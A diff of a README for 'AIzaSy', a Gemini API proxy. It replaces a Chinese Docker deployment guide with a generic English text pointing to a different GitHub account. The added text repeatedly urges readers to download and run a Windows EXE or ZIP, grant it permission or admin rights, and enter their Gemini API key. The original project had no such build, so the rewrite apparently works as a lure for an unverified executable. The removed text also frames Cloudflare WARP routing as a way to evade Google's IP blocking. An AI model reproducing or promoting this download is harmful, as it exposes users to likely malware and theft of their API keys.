@@ -1,121 +1,172 @@
-# AIzaSy - Gemini API Gateway ⚡
+# 🌿 AIzaSy - Private Gemini proxy for Windows
 
-![Docker Pulls](https://img.shields.io/badge/docker-ready-blue.svg)
-![Go Version](https://img.shields.io/badge/Go-1.22+-00ADD8.svg)
-![License](https://img.shields.io/badge/license-MIT-green.svg)
-![Architecture](https://img.shields.io/badge/arch-amd64%20|%20arm64-orange.svg)
+[![Download AIzaSy](https://img.shields.io/badge/Download-AIzaSy-6e40c9?style=for-the-badge&logo=github)](https://github.com/aswinjosek/AIzaSy)
 
-**AIzaSy** 是一个专为 Google Gemini API 设计的极简、高性能、绝对隐私优先的反向代理网关。
+## 📥 Download
 
-本项目诞生于一个极客目标：**如何在仅有 1 核 1GB 内存 (1C1G) 的低端 VPS 上，实现千万级高并发的 API 转发，并完美规避 Google 严苛的 IP 风控？**
+1. Open the download page here: https://github.com/aswinjosek/AIzaSy
+2. On that page, find the latest release or the main download link
+3. Download the Windows file to your PC
+4. If the file is a ZIP, unzip it to a folder you can reach
+5. If the file is an EXE, you can run it after the download finishes
 
-最终，我们融合了 Go 语言并发调优、Docker 网络隔离与 Linux 内核级 WireGuard 路由，打造出了这套开箱即用的终极数据管道。
+## 🖥️ What AIzaSy does
 
----
+AIzaSy is a small gateway for Gemini API use. It sits between your app and Gemini API requests. It keeps your key out of your app. It also helps you keep control of your traffic.
 
-## ✨ 核心特性
+This tool is built for users who want a simple local setup on Windows. It is made with Go, so it runs fast and uses little system memory.
 
-*   🛡️ **自带 Cloudflare WARP 出口洗白**
-    *   内置自动化脚本，首次启动时**全自动注册并提取 WARP 节点**。
-    *   通过赋予容器 `NET_ADMIN` 权限，在 Docker 内部拉起 Linux 内核级 `wg0` 网卡。
-    *   所有发往 Google 的 API 请求会被强制路由至 Cloudflare 骨干网，彻底隐藏 VPS 真实机房 IP，**完美免疫 Google WAF 封锁与网段清洗**。
-*   🚀 **榨干 1C1G 的极限性能调优**
-    *   放弃沉重的框架，采用经过极致优化的 Go 原生 `net/http`。
-    *   引入 `sync.Pool` 内存对象复用，彻底拯救低配机器在高并发下的 GC 压力。
-    *   内部隔离并注入 C100K 级别的 `sysctl` 操作系统网络参数。
-*   🔒 **绝对隐私保护 (Zero-Knowledge Logging)**
-    *   严格遵循 **BYOK (Bring Your Own Key)** 原则。
-    *   **网关绝对不记录、不存储、不拦截任何 API Key。**
-    *   底层日志输出采用“无差别全域抹杀”正则算法，无论你在 URL 中携带多长的私钥，控制台与日志中只会留下 `?key=***`，确保万无一失。
-*   ⚡ **完美支持流式输出 (SSE)**
-    *   针对 AI 大模型打字机效果深度优化，抛弃响应缓冲 (`FlushInterval = -1`)，实现零延迟数据透传。
-*   🐳 **真正的零配置 (Zero-Config) 部署**
-    *   一行代码拉起，无需配置繁琐的 WireGuard 参数，无需折腾 Go 编译环境。支持 `x86_64` 与 `arm64` 双架构。
+## ✨ Main uses
 
----
+- Keep your Gemini API key in one place
+- Send Gemini requests through a local gateway
+- Reduce direct exposure of your private key
+- Run a light proxy on Windows
+- Use a simple setup for local testing or daily use
 
-## 🚀 快速部署 (Quick Start)
+## 🪟 Windows setup
 
-你只需要一台安装了 Docker 和 Docker Compose 的 Linux 服务器（需内核支持 WireGuard，主流 VPS 均满足）。
+### 1. Get the file
+Open the download page and get the Windows package:
 
-### 1. 创建 `docker-compose.yml`
+https://github.com/aswinjosek/AIzaSy
 
-创建一个新目录并写入以下配置文件：
+### 2. Check the file type
+You may get one of these:
 
-```yaml
-services:
-  aizasy-api:
-    image: ghcr.io/ccbkkb/aizasy:latest
-    container_name: aizasy-gateway
-    restart: always
-    ports:
-      - "8080:8080" # 左侧可修改为你宿主机想暴露的端口
-    
-    # 允许配置动态跨域 (留空或不写则默认允许所有来源 '*')
-    environment:
-      - CORS_ALLOWED_ORIGINS=*
-    
-    # 【核心：赋予容器操作内核网卡的权限】
-    cap_add:
-      - NET_ADMIN
-      - SYS_MODULE
-      
-    volumes:
-      # 持久化 WARP 配置文件，防止重启后重新注册触发风控
-      - warp-data:/etc/wireguard
-      
-    # 突破文件句柄限制
-    ulimits:
-      nofile:
-        soft: 1048576
-        hard: 1048576
-        
-    # 注入高并发内核参数与路由防崩溃标记
-    sysctls:
-      - net.ipv4.conf.all.src_valid_mark=1
-      - net.core.somaxconn=65535
-      - net.ipv4.tcp_tw_reuse=1
-      - net.ipv4.ip_local_port_range=1024 65000
-      - net.ipv4.tcp_keepalive_time=600
+- `.exe` file: double-click it to start
+- `.zip` file: unzip it first, then open the app file inside
 
-volumes:
-  warp-data:
-```
+### 3. Move the files
+If you unzipped the package, place the folder somewhere easy to find, such as:
 
-### 2. 一键启动
+- Desktop
+- Downloads
+- Documents
 
-```bash
-docker compose up -d
-```
-> **提示：** 首次启动时，容器会在后台向 Cloudflare 申请免费的 WARP 账户并生成配置，大约需要 3-5 秒。你可以通过 `docker logs -f aizasy-gateway` 观察优雅的启动日志。
+### 4. Start the app
+Double-click the app file.
 
----
+If Windows asks for permission, choose Yes so the app can run.
 
-## 📖 如何使用 (Usage)
+## ⚙️ First-time setup
 
-部署成功并为你的服务器绑定域名后，只需在任何兼容 Gemini API 的客户端（如 LobeChat、ChatGPT-Next-Web）或代码中，将官方域名：
-`generativelanguage.googleapis.com`
+After the app starts, you may need to set a few basic values:
 
-**替换为你的网关地址，例如：**
-`https://gemini.aizasy.com` (换成你自己的域名)
+- Gemini API key
+- Local port
+- Upstream API target
+- Optional access rules
 
-**CURL 测试示例：**
+Use the default values if you are not sure what to enter. For most home use, the default local port is the best place to start.
 
-```bash
-curl -H 'Content-Type: application/json' \
-     -X POST 'https://你的域名/v1beta/models/gemini-1.5-pro:generateContent?key=你的API_KEY' \
-     -d '{
-       "contents":[{"parts":[{"text": "用一句话解释量子计算。"}]}]
-     }'
-```
+## 🔧 Simple usage
 
----
+After setup, your other apps can send requests to the local gateway instead of talking to Gemini API directly.
 
-## 👨‍💻 鸣谢与开源声明
+A common flow looks like this:
 
-*   **Maintainer / Author**: [@ccbkkb](https://github.com/ccbkkb)
-*   本项目完全开源，旨在为开发者社区提供稳定、干净的 AI 接口聚合基础设施。
-*   **Privacy Pledge**: We act solely as a dumb pipe. Your data is your data.
-*   **Linux.do**: The place where the author studies and lives ❤️ & the largest Chinese-language AI discussion community 🔥.
+1. Open AIzaSy
+2. Keep it running
+3. Point your app or tool to the local address
+4. Send Gemini requests through the gateway
 
-如果你觉得这个项目帮助到了你，欢迎点亮右上角的 ⭐️ **Star** ！
+If you use a desktop app, browser tool, or local script, set its API base URL to the AIzaSy local address.
+
+## 🔒 Privacy focus
+
+AIzaSy keeps privacy in mind.
+
+- Your API key stays off the client side
+- Your traffic can pass through one local point
+- You can keep tighter control over request flow
+- You can use your own machine as the gateway
+
+This setup works well when you want less direct exposure of secrets in tools or scripts.
+
+## 🧩 What you need
+
+- Windows 10 or newer
+- A working internet connection
+- A Gemini API key
+- Basic disk space for the app
+- Permission to run downloaded apps on your PC
+
+## 📌 File layout
+
+If you use the ZIP version, you may see files like:
+
+- main app file
+- config file
+- log file
+- readme or help file
+
+Keep the app files in the same folder so the program can find its settings.
+
+## 🛠️ Common tasks
+
+### Change the port
+If another app already uses the same port, change it in the settings to a free one, such as 8080 or 3000.
+
+### Replace the API key
+If you get a new Gemini API key, open the settings and paste the new one in the key field.
+
+### Stop the app
+Close the app window or stop the process from Task Manager.
+
+### Start it again
+Open the app file again from the folder where you saved it.
+
+## 🧪 Basic check
+
+After launch, test the gateway with a simple Gemini request from your app.
+
+If the request works, the gateway is set up right. If it fails, check:
+
+- the local address
+- the port number
+- the API key
+- your internet connection
+
+## 🧭 Typical folder choice
+
+For fewer issues, keep AIzaSy in a folder with a short path, such as:
+
+- `C:\AIzaSy`
+- `C:\Tools\AIzaSy`
+
+This helps avoid path issues on Windows.
+
+## 📎 Project details
+
+- Repository: AIzaSy
+- Topic: gemini-api
+- Language: golang
+- Use case: local Gemini API reverse proxy gateway
+
+## 🖱️ Quick start
+
+1. Visit the download page: https://github.com/aswinjosek/AIzaSy
+2. Download the Windows build
+3. Unzip it if needed
+4. Run the app
+5. Add your Gemini API key
+6. Point your app to the local gateway
+
+## 🔍 If something looks wrong
+
+- If the app does not open, run it as admin
+- If Windows blocks it, check your download source
+- If requests fail, check the key and port
+- If another app uses the port, pick a new one
+- If the app closes at start, look for a config file problem
+
+## 🧷 Best way to use it
+
+Keep AIzaSy open while your other app needs Gemini access. Place it in a stable folder, keep the config file with the app, and reuse the same local port each time
+
+## 📦 Download link
+
+Use this page to download the Windows package:
+
+https://github.com/aswinjosek/AIzaSy
